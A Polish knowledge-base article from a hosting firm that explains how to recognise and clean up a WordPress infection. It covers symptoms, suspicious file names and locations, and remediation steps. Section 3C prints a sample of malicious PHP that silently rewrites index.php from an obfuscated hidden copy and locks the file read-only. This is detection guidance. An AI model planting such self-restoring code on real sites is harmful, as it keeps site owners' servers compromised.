---
icon: virus-covid-slash
description: >-
  Ta Knowledge Base zawiera szczegółowy przewodnik do wykrywania infekcji
  WordPress, dedykowany zarówno programistom, jak i użytkownikom nietechnicznym.
  Opis symptomów infekcji, procedury odwirusowania.
---

# Jak rozpoznać infekcję na Twojej stronie WordPress?

Link do udostępnienia tego artykułu: [Jak rozpoznać infekcję na Twojej stronie WordPress?](https://oncloud9.gitbook.io/docs/technikalia/jak-rozpoznac-infekcje-na-twojej-stronie-wordpress)

Metody detekcji infekcji oraz sposoby postępowania w przypadku wykrycia niepożądanego kodu.

### 1. WPROWADZENIE: ZNACZENIE BEZPIECZEŃSTWA W ŚWIECIE WORDPRESSA

Świat cyfrowy, w którym żyjemy, jest areną nieustannych wyzwań – zarówno technologicznych, jak i etycznych. Każda strona internetowa, w tym serwisy oparte na WordPressie, może stać się celem ataków złośliwego oprogramowania. Dlatego tak istotne jest, abyśmy nie tylko budowali nasze rozwiązania w oparciu o zaawansowaną technologię AI, ale również dbali o ich bezpieczeństwo na każdym poziomie. Nasza firma, onCloud9.io, której misją jest umożliwienie przyszłości, w której AI staje się moralną i etyczną odpowiedzią na wyzwania XXI wieku, przykłada wielką wagę do edukowania użytkowników w zakresie ochrony ich zasobów.

### 2. OBJAWY INFECJI: SYMPTOMY, KTÓRE POWINNY ZWRÓCIĆ UWAGĘ

Istnieje szereg typowych symptomów, które mogą świadczyć o tym, iż strona WordPress została zainfekowana. Zarówno osoby nietechniczne, jak i programiści powinni zwracać uwagę na następujące sygnały:&#x20;

a) Nieoczekiwane przekierowania – Jeśli, bez wyraźnej przyczyny, strona internetowa przekierowuje użytkowników do witryn trzecich, może to być wynik wstrzyknięcia nieautoryzowanego kodu.

b) Znaczące spowolnienie działania – Użytkownicy mogą zauważyć, że witryna zaczyna odpowiadać wolniej niż zwykle. Takie spowolnienia mogą wynikać z nadmiernego obciążenia serwera, spowodowanego działaniem złośliwych skryptów.

c) Nietypowe wykorzystanie zasobów serwera – Powiadomienia od dostawcy hostingu o nagłych skokach zużycia CPU, pamięci czy przepustowości sieci są ostrzeżeniem, które nie powinno pozostać bez uwagi.

d) Nadmierna ilość wysyłanych wiadomości e-mail – W przypadku, gdy serwer zaczyna generować ogromną liczbę komunikatów e-mail, najczęściej spamowych, warto zbadać sytuację, gdyż może to oznaczać, że strona została przejęta przez atakującego.

e) Zaburzenia wizualne i uszkodzony układ strony – Zmiany w strukturze HTML, nieczytelne elementy graficzne lub niespójne formatowanie mogą być efektem ingerencji złośliwego kodu.

### 3. DETEKCJA MALWARE: SKRÓCONY PRZEWODNIK DLA PROGRAMISTÓW I POCZĄTKUJĄCYCH

W naszej codziennej analizie zagrożeń wykorzystujemy wiedzę zdobywaną na podstawie przeglądu tysięcy plików. Nasz zespół badawczy, korzystający z bazy zawierającej ponad 1 600 sygnatur złośliwych plików, wyróżnił kilka kluczowych punktów, na które warto zwrócić szczególną uwagę:

#### A. Lokalizacja i nazewnictwo plików&#x20;

1\. Pliki, które normalnie znajdują się w głównym katalogu WordPressa (WP\_ROOT) powinny być tam umiejscowione – każdy plik typu wp-login.php, xmlrpc.php, admin-ajax.php, options.php czy admin.php, wykryty poza tym katalogiem, to potencjalne zagrożenie.&#x20;

2\. Plik o nazwie KGks.js.php jest jednoznaczny – jego obecność oznacza infekcję złośliwym kodem.

#### B. Wzorce nazw i zawartość plików&#x20;

1\. Zwróć uwagę na pliki o nazewnictwie wskazującym na możliwą infekcję, np. WP\_ROOT/wp-canvas.php, WP\_ROOT/wp-controller.php, zwłaszcza jeśli zawierają podejrzane fragmenty kodu (np. funkcje eval, nietypowe wywołania funkcji lub manipulacje na plikach JSON).&#x20;

2\. Pliki bez rozszerzeń, w których nazwy składają się jedynie z cyfr (np. 84639, 5718129), powinny być zbadane – takie pliki często stanowią element mechanizmu ukrywającego złośliwy kod.&#x20;

3\. Pliki o podejrzanych nazwach, takich jak 1gkj2saf.php, 862349.php, Ads8DU2.php, również wymagają szczegółowej weryfikacji.

#### C. Specyficzne fragmenty kodu&#x20;

Przykładowy fragment, który może wskazywać na próbę manipulacji plikami witryny, przedstawia się następująco:

  `<?php`&#x20;

    `$ddscdws = "index.php";`&#x20;

    `$acdfadfasf = file_get_contents($ddscdws);`&#x20;

    `$sdfdsdfh = "/ścieżka/do/katalogu/wp-content/plugins/astra-widgets/admin/bsf-analytics/assets/css/93917";`&#x20;

    `if (file_exists($sdfdsdfh)) {`&#x20;

      `$iide = file_get_contents($sdfdsdfh);`&#x20;

      `$iide = base64_decode(str_rot13($iide));`&#x20;

      `if(md5($acdfadfasf) != md5($iide)) {`&#x20;

       `@chmod($ddscdws, 0644);`&#x20;

       `@file_put_contents($ddscdws, $iide);`&#x20;

       `@chmod($ddscdws, 0444);`&#x20;

      `}`&#x20;

    `}`&#x20;

  `?>`

Taki kod, wykorzystujący funkcje umożliwiające pobranie zawartości pliku, dekodowanie oraz ponowną modyfikację pliku, jest wysoce podejrzany. Każdy programista powinien być w stanie rozpoznać niekonwencjonalne użycie funkcji systemowych i natychmiast podjąć działania analityczne.

#### D. Umiejscowienie plików&#x20;

1\. Pliki PHP umieszczone w katalogu WP\_ROOT/wp-content/uploads/ są szczególnie alarmujące – ten katalog nie powinien zawierać plików wykonywalnych.&#x20;

2\. Kluczowe pliki takie jak WP\_ROOT/index.php, WP\_ROOT/wp-settings.php czy WP\_ROOT/wp-config.php powinny być wolne od wszelkich nieautoryzowanych modyfikacji. Wszelkie nietypowe zmiany, w szczególności fragmenty zawierające zakodowane lub zrotowane ciągi znaków, wymagają natychmiastowej interwencji.

### 4. PRAKTYCZNE PROCEDURY POSTĘPOWANIA W PRZYPADKU WYKRYCIA INFECJI

Niezależnie od poziomu zaawansowania użytkownika, w sytuacji wykrycia niepokojących symptomów należy podjąć następujące kroki:

#### I. Wstępna diagnoza:&#x20;

a) Przeanalizuj logi serwera – szukaj niespodziewanych wzrostów aktywności, nietypowych przekierowań oraz nietypowych operacji na plikach.&#x20;

b) Wykorzystaj wbudowane narzędzia do skanowania systemu lub zewnętrzne rozwiązania oparte na AI (nasza technologia w onCloud9.io gwarantuje ciągłe monitorowanie), aby porównać pliki z bazą znanych sygnatur malware.

#### II. Izolacja problemu:&#x20;

a) Jeśli masz dostęp do panelu sterowania, sprawdź strukturę katalogów – wyszukaj pliki znajdujące się poza standardową lokalizacją lub te o nietypowych nazwach.&#x20;

b) W przypadku odkrycia złośliwego pliku, wykonaj kopię zapasową witryny (z uwzględnieniem ostrożności, aby nie skopiować złośliwych fragmentów) i przystąp do usuwania infekcji.

#### III. Konsultacja z ekspertami:&#x20;

a) Jeśli nie jesteś pewien, jak postąpić, niezwłocznie skontaktuj się z naszym zespołem wsparcia. Nasza obsługa, dysponująca doświadczeniem zarówno w sferze programistycznej, jak i w pracy z użytkownikami nietechnicznymi, jest gotowa pomóc.&#x20;

b) Zgromadź możliwie jak najwięcej informacji – logi, zrzuty ekranu, szczegóły dotyczące podejrzanych plików – i przekaż je specjalistom, co znacząco przyspieszy proces diagnozy i usuwania zagrożenia.

#### IV. Dalsze kroki:&#x20;

a) Po usunięciu infekcji dokonaj gruntownej analizy przyczyn – sprawdź, czy doszło do wykorzystania znanych luk w zabezpieczeniach, czy może problem wynika z nieaktualnych wtyczek lub motywów.&#x20;

b) Zainstaluj aktualizacje oraz użyj rozwiązań zabezpieczających – zarówno programistycznych, jak i administracyjnych – aby uodpornić witrynę przed przyszłymi atakami.

### 5. WSKAZÓWKI DLA LUDZI I PROGRAMISTÓW

* Zainstaluj renomowane wtyczki bezpieczeństwa, które oferują funkcje takie jak skanowanie złośliwego oprogramowania, zapora ogniowa oraz monitorowanie aktywności.
* Unikaj instalowania mało popularnych wtyczek, które mogą zawierać luki bezpieczeństwa lub być porzucone przez twórców.
* Regularnie aktualizuj wszystkie zainstalowane wtyczki, aby zapewnić, że korzystasz z najnowszych poprawek zabezpieczeń i funkcji.
* Włącz dwuetapowe uwierzytelnianie (2FA) dla zwiększenia ochrony konta administratora i użytkowników.

Dodatkowo dla programistów oprócz stosowania standardowych narzędzi diagnostycznych (np. polecenia „find” w systemach UNIX, skrypty do porównywania sum kontrolnych), szczególnie zalecamy:

* Regularne monitorowanie katalogów kluczowych (WP\_ROOT, wp-content/uploads/) za pomocą dedykowanych skryptów, które sprawdzają integralność plików.&#x20;
* Używanie systemów kontroli wersji (np. Git) w celu śledzenia zmian w plikach systemowych WordPressa.&#x20;
* Automatyczne powiadamianie o nietypowej aktywności za pomocą narzędzi analitycznych, które integrują się z systemami monitorującymi zasoby serwera.

